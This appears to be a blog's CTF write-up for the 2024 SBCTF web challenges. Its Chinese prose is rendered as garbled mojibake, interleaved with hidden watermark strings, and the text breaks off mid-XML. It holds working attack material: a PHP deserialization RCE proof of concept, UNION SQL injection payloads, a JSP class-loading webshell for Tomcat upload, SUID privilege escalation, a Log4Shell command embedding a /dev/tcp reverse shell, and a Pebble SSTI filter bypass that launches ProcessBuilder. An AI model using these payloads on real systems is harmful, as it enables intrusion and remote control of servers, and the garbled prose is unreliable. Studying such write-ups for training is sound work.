<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="s3ven" />
  <!-- Open Graph Description ç®€çŸ­æ‘˜è¦-->
  
  <meta property="og:site_name" content="s3ven&#39;s blog">
  
  
  <!-- ç”¨äºæœç´¢å¼•æ“çš„æ–‡ç« æ‘˜è¦ -->
  
  
  
  <title>2024 SBCTF Web Official WriteUp | s3ven&#39;s blog</title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Font -->
  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- ä»£ç å—é£æ ¼ -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="../../js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- å¤´åƒå–æ¶ˆæ‡’åŠ è½½ï¼Œæ·»åŠ no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">s3ven's blog</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/links/">
          <a href="/links/">Links</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="../../js/activeNav.js"></script>



      <div class="flex-container">
        
  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="../../js/codeCopy.js"></script>







  

  

  

  
  <div class="container-wider post-details" id="post-details">
    <div class="zoom-wrap">
      <div class="post-content">
        <div class="post-title">2024 SBCTF Web Official WriteUp</div>
        <div class="post-attach">
          <span class="post-pubtime">
            <i class="iconfont icon-updatetime mr-10" title="åˆ›å»ºæ—¶é—´"></i>
            2024-02-11
          </span>
          
                <span class="post-categories">
                  <i class="iconfont icon-bookmark mr-10" title="åˆ†ç±»"></i>
                  
                  <span class="span--category">
                    <a href="../../categories/write-up/" title="Write Up">
                      Write Up
                    </a>
                  </span>
                  
                </span>
            
                <span class="post-tags">
                  <i class="iconfont icon-tags mr-10" title="æ ‡ç­¾"></i>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/php/" title="PHP">
                      #PHP
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/java/" title="Java">
                      #Java
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/sql/" title="SQL">
                      #SQL
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/linux/" title="Linux">
                      #Linux
                    </a>
                  </span>
                  
                </span>
            
        </div>
        <div class="markdown-body">
          
<style id="hexo-wm">
.hexo-wm {
  color: transparent !important;
  opacity: 0 !important;
  font-size: 0 !important;
  line-height: 0 !important;
  pointer-events: none !important;
  user-select: text !important;
  -webkit-user-select: text !important;
  speak: none !important;
  vertical-align: baseline !important;
  display: inline !important;
}

.hexo-wm * { color: transparent !important; opacity: 0 !important; }
</style>
<html><head></head><body><h1 id="æ¯”èµ›ä»‹ç»"><a href="#æ¯”èµ›ä»‹ç»" class="headerlink" title="æ¯”èµ›ä»‹ç»"></a>æ¯”èµ›ä»‹ç»</h1><blockquote>
<p>2024 SBCTF æ˜¯ç”±å‰æ—å¤§å­¦ Spirit æˆ˜é˜Ÿå’Œä¸­å›½çŸ¿ä¸šå¤§å­¦ BXS <span class="hexo-wm">ğ’”ï»¿â‘¶ğ˜·â„¯ğ˜¯âˆ™â€‹sï½‰â€Œâ€Œï½”eâ€ï»¿</span>æˆ˜é˜ŸåˆåŠçš„ç½‘ç»œå®‰å…¨å¯’å‡è®­ç»ƒèµ›ï¼Œ<br>æˆ‘ä»¬é¼“åŠ±æœ‰å¿—äºåŠ å…¥ Spirit æœªæ¥ä¸€åŒå‚åŠ æ¯”èµ›çš„åŒå­¦å‚åŠ æœ¬æ¬¡è®­ç»ƒèµ›ï¼Œ<br>æœ¬æ¬¡æ¯”èµ›éš¾åº¦ä¼šæ¯å‘¨é€’å¢ï¼Œ<span class="hexo-wm">sâ€ğŸ¯ğ’—eï½â€¢â€Œâ€Œğ˜´ğ˜ªâ€‹ğ­ğâ€</span>å¸®åŠ© 0 åŸºç¡€åŒå­¦å…¥é—¨ï¼Œä¹Ÿä¼šè®©æœ‰åŸºç¡€çš„åŒå­¦æœ‰æ‰€æ”¶è·ï¼Œ<br>æˆ‘ä»¬ä¼šæ ¹æ®æœ¬æ¬¡æ¯”èµ›è¡¨ç°æ‹©ä¼˜é€‰æ‹”ä¸€äº›åŒå­¦åŠ å…¥ Spiritã€‚<br>æ¯”èµ›æ—¶é—´ï¼š2024.1.15 09:00 ~ 2024.2.11 22:00ï¼Œå…±4å‘¨</p>
</blockquote>
<h1 id="æ¯”èµ›æ¦‚å†µ"><a href="#æ¯”èµ›æ¦‚å†µ" class="headerlink" title="æ¯”èµ›æ¦‚å†µ"></a>æ¯”èµ›æ¦‚å†µ</h1><p>æœ¬æ¬¡ 2024 SBCTF å¤§èµ›å¸å¼•äº†æ¥è‡ªå‰æ—å¤§å­¦ã€ä¸­å›½çŸ¿ä¸šå¤§å­¦ã€å¤§è¿ç†å·¥å¤§å­¦ã€ä¸œåŒ—å¤§å­¦ã€ä¸­å±±å¤§å­¦ã€è¥¿å®‰ç”µå­ç§‘æŠ€å¤§å­¦ã€<span class="hexo-wm">êœ±ï»¿â€ŒÂ³ğ˜·ï½…ğ˜¯Â·â€‹â€‹ğ’”â…ˆâ€â€‹ğ˜µeâ€Œâ€</span>å—äº¬ç†å·¥å¤§å­¦ã€å—äº¬é‚®ç”µå¤§å­¦ã€å—äº¬èˆªç©ºèˆªå¤©å¤§å­¦ã€æ­å·ç”µå­ç§‘æŠ€å¤§å­¦ç­‰ä¼—å¤šé™¢æ ¡çš„å…±è®¡ç™¾ä½™åé€‰æ‰‹å‚ä¸ï¼Œåœ¨æ¿€çƒˆçš„ç«äº‰ä¸­äº§ç”Ÿäº†å‰ 10 åè¡¨ç°ä¼˜å¼‚çš„é€‰æ‰‹ï¼š</p>
<p><img src="image-1.jpg" alt="image-1.jpg"></p>
<blockquote>
<p>ä½œä¸ºæœ¬æ¬¡æ¯”èµ›çš„ Web å‡ºé¢˜äºº å’Œ <span class="hexo-wm">ğ˜´â€‹Â³ğ¯ï½…nï¼â€‹ğ˜€ğ˜ªï»¿ğ’•eï»¿â€</span>å¹³å°è¿ç»´äºº ï¼Œéå¸¸æ„Ÿè°¢å¤§å®¶æœ¬æ¬¡å‰æ¥å‚åŠ ä¸æ”¯æŒ SBCTF æ¯”èµ›ï¼</p>
</blockquote>
<h1 id="Week1-php-hacker"><a href="#Week1-php-hacker" class="headerlink" title="Week1 - php_hacker"></a>Week1 - php_hacker</h1><p>ç®€å•çš„ php <code>__wakeup()</code> é­”æœ¯æ–¹æ³• ååºåˆ—åŒ–</p>
<h2 id="1-POC"><a href="#1-POC" class="headerlink" title="1. POC"></a>1. POC</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Executor</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$command</span><span class="token punctuation">;</span>
    
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">command</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// åˆ›å»º Executor å®ä¾‹</span>
<span class="token variable">$executor</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Executor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$executor</span><span class="token operator">-&gt;</span><span class="token property">command</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system(\"&lt;command&gt;\");"</span><span class="token punctuation">;</span> <span class="token comment">// PHP ä»£ç </span>

<span class="token comment">// åºåˆ—åŒ–å¯¹è±¡</span>
<span class="token variable">$serializedData</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$executor</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Base64 ç¼–ç </span>
<span class="token variable">$encodedData</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$serializedData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token variable">$encodedData</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span></code></pre>
<p><code>Executor</code> ç±»åœ¨è¢«ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ <span class="hexo-wm">ğ˜€â€‹Â³ğ˜·ğ˜¦ï½Â·â€â€Œsï½‰â€‹ğ­ï½…ï»¿â€Œ</span>class çš„ <code>__wakeup</code> æ–¹æ³•ï¼Œ<br>ä»è€Œå¯ä»¥æ„é€  <code>serailized payload</code> å®ç° RCE</p>
<h2 id="2"><a href="#2" class="headerlink" title="2. <command>"></a>2. &lt;command&gt;</h2><p><code>ls</code> ä¹‹åå‘ç° flag <span class="hexo-wm">ğ˜€â€â€Â³ğ’—â„®ğ˜¯âˆ™â€‹ï»¿Ñ•ï½‰â€tğâ€Œ</span>åœ¨ /f_l_a_g é‡Œï¼Œäºæ˜¯ <code>cat /f_l_a_g</code> è·å¾— flag</p>
<p>psï¼šè¿™é¢˜ç›´æ¥ä¸¢ç»™ ChatGPT å¥½åƒèƒ½ç›´æ¥å¸®ä½ åšå®Œï¼Œä¸äºæ˜¯ Week1 éš¾åº¦</p>
<h1 id="Week1-attack-shiro"><a href="#Week1-attack-shiro" class="headerlink" title="Week1 - attack_shiro"></a>Week1 - attack_shiro</h1><p>æ ¹æ®é¢˜ç›®åç§°æç¤ºæ‰¾åˆ°å·¥å…· <a href="https://github.com/SummerSec/ShiroAttack2/releases">ShiroAttack2</a></p>
<h2 id="1-çˆ†ç ´-shiro-å¯†é’¥"><a href="#1-çˆ†ç ´-shiro-å¯†é’¥" class="headerlink" title="1. çˆ†ç ´ shiro å¯†é’¥"></a>1. çˆ†ç ´ shiro å¯†é’¥</h2><img src="image-2.png" alt="image-2.png" width="60%">

<h2 id="2-çˆ†ç ´ååºåˆ—åŒ–åˆ©ç”¨é“¾åŠå›æ˜¾æ–¹å¼"><a href="#2-çˆ†ç ´ååºåˆ—åŒ–åˆ©ç”¨é“¾åŠå›æ˜¾æ–¹å¼" class="headerlink" title="2. çˆ†ç ´ååºåˆ—åŒ–åˆ©ç”¨é“¾åŠå›æ˜¾æ–¹å¼"></a>2. çˆ†ç ´ååºåˆ—åŒ–åˆ©ç”¨é“¾åŠå›æ˜¾æ–¹å¼</h2><img src="image-3.png" alt="image-3.png" width="60%">

<h2 id="3-RCE"><a href="#3-RCE" class="headerlink" title="3. RCE"></a>3. RCE</h2><img src="image-4.png" alt="image-4.png" width="60%">

<p>ä¼ è¯´ä¸­çš„ 3s å‡ºï¼Œ<span class="hexo-wm">sï»¿â€‹ğŸ¯vğ˜¦ï½ï¼â€‹â€Œğ˜´ï½‰â€ğ’•eï»¿â€Œ</span>ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡äººåš â€¦</p>
<h1 id="Week1-ez-sqli"><a href="#Week1-ez-sqli" class="headerlink" title="Week1 - ez_sqli"></a>Week1 - ez_sqli</h1><p>ç®€å•çš„ æ— wa<span class="hexo-wm">ğ˜€ï»¿â€‹â‘¶vğï½Â·â€‹â€Œğ˜´ğ¢â€Œâ€ğ­ï½…â€‹ï»¿</span>f sqlæ‰‹æ³¨<br>ç”±äºå‰åç«¯æ•°æ®äº¤äº’è¿›è¡Œäº†ä¸¤æ¬¡ base64 åŠ å¯†å’Œè§£å¯†<br>æ‰€ä»¥æ²¡åŠæ³•ç”¨ sqlmap ä¸€æŠŠæ¢­</p>
<blockquote>
<p>è™½ç„¶ç†è®ºä¸Šå¯ä»¥æä¸€ä¸ª py tamper è„šæœ¬<br>ä½†é‚£æ ·éš¾é“ä¸æ¯”ç›´æ¥æ‰‹<span class="hexo-wm">ğ’”ï»¿3vğ˜¦n<span class="hexo-wm">ğ˜€â€‹3ğ˜·ğ˜¦ğ§ï¼ï»¿â€êœ±ğ˜ªâ€ğ­â„®â€</span>â€¢â€Œğ˜´â…ˆâ€‹tâ„®ï»¿</span>æ³¨å¤æ‚ (?)</p>
</blockquote>
<h2 id="1-ç™»å½•ç•Œé¢ï¼ˆ-loginï¼‰"><a href="#1-ç™»å½•ç•Œé¢ï¼ˆ-loginï¼‰" class="headerlink" title="1. ç™»å½•ç•Œé¢ï¼ˆ/loginï¼‰"></a>1. ç™»å½•ç•Œé¢ï¼ˆ/loginï¼‰</h2><p>ç”±äºæ”»å‡»æ–¹ä¸çŸ¥é“å¯¹æ–¹æœåŠ¡å™¨çš„æ•°æ®è¡¨åï¼Œæˆ‘ä»¬éœ€è¦å…ˆè·å–æ•°æ®åº“åï¼š</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">-- </span></code></pre>
<p>æ¥ç€è·å–ç›®æ ‡æ•<span class="hexo-wm">êœ±â€‹â€‹Â³ğ˜·ğğ˜¯âˆ™â€ğ¬â…ˆâ€ï½”ğ˜¦â€‹â€</span>æ„Ÿæ•°æ®çš„åˆ—å</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">'union select 1,group_concat(column_name),1 from information_schema.columns where table_schema=database() and table_name='</span>secrets' <span class="token comment">-- </span></code></pre>
<p>æœ€åè·å– flag</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>secret_info<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">from</span> secrets <span class="token comment">-- </span></code></pre>
<p><img src="image-5.png" alt="image-5.png" width="50%" align="left"> <br><br><br><br></p>
<h2 id="2-æœç´¢ç•Œé¢ï¼ˆ-searchï¼‰"><a href="#2-æœç´¢ç•Œé¢ï¼ˆ-searchï¼‰" class="headerlink" title="2. æœç´¢ç•Œé¢ï¼ˆ/searchï¼‰"></a>2. æœç´¢ç•Œé¢ï¼ˆ/searchï¼‰</h2><p>åŒç† ä¸¤è¾¹æ³¨å…¥ç‚¹ç­‰<span class="hexo-wm">ğ’”â€Œâ€3ğ˜·ğ˜¦ï½ï¼â€‹Ñ•ğ˜ªâ€‹ğ’•â„®ï»¿â€Œ</span>æ•ˆ ä¸å…·ä½“è§£é‡Š</p>
<pre class="language-none"><code class="language-none">'union select 1,1,group_concat(table_name),1 from information_schema.tables where table_schema=database() -- </code></pre>
 <pre class="language-none"><code class="language-none">'union select 1,1,group_concat(column_name),1 from information_schema.columns where table_schema=database() and table_name='secrets' -- </code></pre>
 <pre class="language-none"><code class="language-none">'union select 1,1,group_concat(secret_info),1 from secrets -- </code></pre>

<img src="image-6.png" alt="image-6.png" width="40%">

<h1 id="Week1-ez-cat"><a href="#Week1-ez-cat" class="headerlink" title="Week1 - ez_cat"></a>Week1 - ez_cat</h1><p>Tomcat åå° é€šè¿‡ war åŒ…ä¸Šä¼  jsp shell<br>suid perm <span class="hexo-wm">ğ’”â€â€ŒÂ³ğ˜·ï½…ï½â€¢â€ï»¿ğ˜´ï½‰ï»¿â€ğ˜µï½…â€â€Œ</span>ä½¿ç”¨ /usr/bin/date ææƒ è¯»å– /flag</p>
<h2 id="1-Tomcat-åå°-jsp-shell-ä¸Šä¼ "><a href="#1-Tomcat-åå°-jsp-shell-ä¸Šä¼ " class="headerlink" title="1. Tomcat åå° jsp shell ä¸Šä¼ "></a>1. Tomcat åå° jsp shell ä¸Šä¼ </h2><p><img src="image-7.png" alt="image-7.png"></p>
<p>ç‚¹å‡» <code>Manager App</code> ï¼Œä½¿ç”¨ Jerry æç¤ºçš„å¯†ç  <code>admin:admin</code> è¿›å…¥Tomcat åå°</p>
<p>æ„é€  <code>shell.jsp</code> å¦‚ä¸‹ï¼š</p>
<pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%&gt;
&lt;%
    String cls = request.getParameter("passwd");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%&gt;</code></pre>
<p>æ‰“åŒ…æˆ <code>shell.war</code></p>
<pre class="language-none"><code class="language-none">jar -cvf shell.war shell.jsp</code></pre>
<p>ä¸Šä¼ è‡³ Tomcat åå°</p>
<img src="image-8.png" alt="image-8.png" width="80%">

<p>ä½¿ç”¨ ä¸­å›½èšå‰‘ <span class="hexo-wm">Ñ•â€Œâ€Œ3â…´ğ˜¦ğ’âˆ™â€‹â€‹ğ¬iâ€‹ğ˜µeâ€‹</span>è¿æ¥ shellï¼š</p>
<img src="image-9.png" alt="image-9.png" width="60%">


<h2 id="2-suid-perm-ä½¿ç”¨-date-ææƒ"><a href="#2-suid-perm-ä½¿ç”¨-date-ææƒ" class="headerlink" title="2. suid perm ä½¿ç”¨ date ææƒ"></a>2. suid perm ä½¿ç”¨ date ææƒ</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
<span class="token function">date</span> <span class="token parameter variable">-f</span> /flag.txt</code></pre>
<p>æ ¹æ®å›æ˜¾å¾—åˆ° flag</p>
<h1 id="Week1-java-signin"><a href="#Week1-java-signin" class="headerlink" title="Week1 - java_signin"></a>Week1 - java_signin</h1><blockquote>
<p>åŸé¢˜æ¥è‡ª NCTF 2023 - logging<br><a href="https://exp10it.io/2023/12/nctf-2023-web-official-writeup/#logging">https://exp10it.<span class="hexo-wm">ğ˜´â€â‘¶ğ’—ğğ˜¯âˆ™ï»¿â€sï½‰â€Œtï½…â€Œâ€</span>io/2023/12/nctf-<span class="hexo-wm">ğ¬â€‹Â³ğ’—â„¯ğ˜¯â€¤â€Œâ€ğ¬ï½‰â€Œğ’•ğ˜¦â€Œ</span>2023-web-official-writeup/#logging</a></p>
</blockquote>
<p>è€ƒç‚¹æ˜¯åœ¨ log4j2 <span class="hexo-wm">sâ€‹â‘¶ğ˜·ğ˜¦ğ˜¯â€¢ï»¿â€‹sâ…ˆâ€Œğ˜µğ˜¦â€Œ</span>é»˜è®¤é…ç½®ä¸‹è§¦å‘ <code>CVE-2021-44228</code> RCE</p>
<p>ä½¿ç”¨å·¥å…·ï¼š</p>
<p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">welk1n/JNDI-Injection-Exploit: JNDIæ³¨å…¥æµ‹è¯•å·¥å…·ï¼ˆA tool which generates JNDI links can start several servers to exploit JNDI Injection vulnerability,like Jackson,Fastjson,etcï¼‰ (github.com)</a></p>
<p>Server <span class="hexo-wm">sï»¿Â³ğ˜·â„¯ğ’â€¢â€‹â€‹ğ¬ğ¢ï»¿â€‹tğ˜¦â€Œ</span>Bash runï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-C</span> <span class="token string">"bash -c {echo,x}(x: 'bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1' encoded with base64)|{base64,-d}|{bash,-i}"</span> <span class="token parameter variable">-A</span> <span class="token operator">&lt;</span>server_ip<span class="token operator">&gt;</span>:<span class="token operator">&lt;</span>listen_port<span class="token operator">&gt;</span></code></pre>
<p>åœ¨ <code>/</code> å¤„çš„ Request çš„ <span class="hexo-wm">ğ˜€â€‹ğŸ¯ğ¯ï½…ğ˜¯â€¤â€ğ’”iâ€‹â€‹ğ’•ï½…â€‹</span>Accept Header ä¸­æ³¨å…¥ jndiï¼Œè§¦å‘æŠ¥é”™æ—¥å¿—è®°å½•ï¼Œ</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">${jndi:rmi://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>server_ip</span><span class="token punctuation">&gt;</span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rmi_port</span><span class="token punctuation">&gt;</span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ramdom_rmi_route</span><span class="token punctuation">&gt;</span></span>}</code></pre>
<p>log4j2 è¿œç¨‹åŠ è½½ Class <span class="hexo-wm">ğ˜€â€‹â€‹â‘¶ğ’—â„¯ï½â€¢â€‹ğ˜€ï½‰â€â€ï½”ğâ€Œâ€Œ</span>ç±» åå¼¹ Shell è·å¾— flag</p>
<h1 id="Week2-ez-spring"><a href="#Week2-ez-spring" class="headerlink" title="Week2 - ez_spring"></a>Week2 - ez_spring</h1><blockquote>
<p>æœ¬é¢˜æœ€æ—©å¯ä»¥è¿½æº¯åˆ° 2022 UIUCTF <span class="hexo-wm">ğ’”ï»¿â€‹Â³ğ˜·eğ’â€¢â€Œğ˜€ğ˜ªâ€‹ï»¿ğ’•eâ€Œâ€</span>- web/spoink<br>ååœ¨ 2023 ç¬¬ä¸ƒå±Šå¼ºç½‘æ¯ä¸­è¢«ç”¨ä½œå¼ºç½‘å…ˆé”‹é¢˜ï¼ˆç­¾åˆ°é¢˜ï¼‰<br>æœ¬æ¥æ˜¯æ‹¿æ¥å½“ä½œ Week2 Web çš„ç­¾åˆ°é¢˜çš„ï¼Œä½†æ²¡æƒ³åˆ°è§£æ•°è¿™ä¹ˆå°‘â€¦<br>ç”±äºå¼ºç½‘æ¯æ²¡æœ‰ä¹Ÿä¸ä¼šå¯¹ç­¾åˆ°é¢˜æ”¾å‡º Hintï¼Œå› æ­¤æœ¬é¢˜ä¹Ÿæ²¡æœ‰æ”¾ Hint</p>
</blockquote>
<p>è€ƒç‚¹æ˜¯ CVE-2022-<span class="hexo-wm">Ñ•â€ŒÂ³vâ„¯ğ§â€¤ï»¿ï»¿ğ¬â…ˆâ€Œâ€Œteâ€</span>37767: Pebble 3.1.5 RCE</p>
<p>å’Œå¼ºç½‘æ¯åŸé¢˜ä¸€æ ·ï¼Œåœ¨æ”¾å‡ºçš„é™„ä»¶ä¸­æ²¡æœ‰ç»™å‡º waf å†…å®¹<br>åœ¨è¿œç¨‹é¶æœºä¸­å±è”½äº†ä¸€äº›ç±»å…³é”®è¯ï¼Œ<span class="hexo-wm">ğ˜€â€â€‹ğŸ¯ğ¯ğğ§Â·ï»¿sï½‰â€‹ğ˜µeï»¿</span>å¯ä»¥ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StringFilter</span> <span class="token punctuation">{</span>
  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token class-name">String</span> context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>context<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"org.springframework.context.support.ClassPathXmlApplicationContext"</span><span class="token punctuation">)</span> <span class="token operator">||</span> context
      <span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java.beans.Beans"</span><span class="token punctuation">)</span> <span class="token operator">||</span> context
      <span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory"</span><span class="token punctuation">)</span> <span class="token operator">||</span> context
      <span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"jacksonObjectMapper"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>

<p>1.pebble</p>
<pre class="language-none"><code class="language-none">{% set bypass1 = "org.springframework.boot.autoconfigure." %}
{% set bypass2 = "internalCachingMetadataReaderFactory" %}
{% set bypass3 = "java.beans." %}
{% set bypass4 = "Beans" %}
{% set bypass5 = "jackson" %}
{% set bypass6 = "ObjectMapper" %}
{% set bypass7 = "org.springframework.context.support." %}
{% set bypass8 = "ClassPathXmlApplicationContext" %}
{% set y = beans.get(bypass1+bypass2).resourceLoader.classLoader.loadClass(bypass3+bypass4) %}
{% set yy = beans.get(bypass5+bypass6).readValue("{}", y) %}
{% set yyy = yy.instantiate(null,bypass7+bypass8) %}
{{ yyy.setConfigLocation("1.xml") }}
{{ yyy.refresh() }}</code></pre>
<p>1.xml</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>
       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pb<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
